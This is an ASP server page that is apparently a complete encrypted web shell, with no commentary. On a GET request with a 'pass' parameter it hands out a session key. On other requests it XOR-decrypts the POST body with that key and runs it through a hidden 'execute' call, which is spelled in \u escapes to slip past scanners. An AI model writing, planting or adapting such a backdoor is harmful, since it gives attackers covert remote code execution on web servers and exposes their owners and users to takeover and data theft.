<% 
function xx(str) 
    str=replace(str,"\u","")
    xx=""
    dim i
    for i=1 to len(str) step 4
        xx=xx & ChrW(cint("&H" & mid(str,i,4)))
    next
end function
Response.CharSet = "UTF-8" 
If Request.ServerVariables("REQUEST_METHOD")="GET" And Request.QueryString("pass") Then
For a=1 To 8
RANDOMIZE
k=Hex((255-17)*rnd+16)+k
Next
Session("k")=k
response.write(k)
Else
k=Session("k")
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
dim a(5)
a(0)=xx("\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0072\u0065\u0073\u0075\u006c\u0074\u0029")
eval(a(0))
End If
%>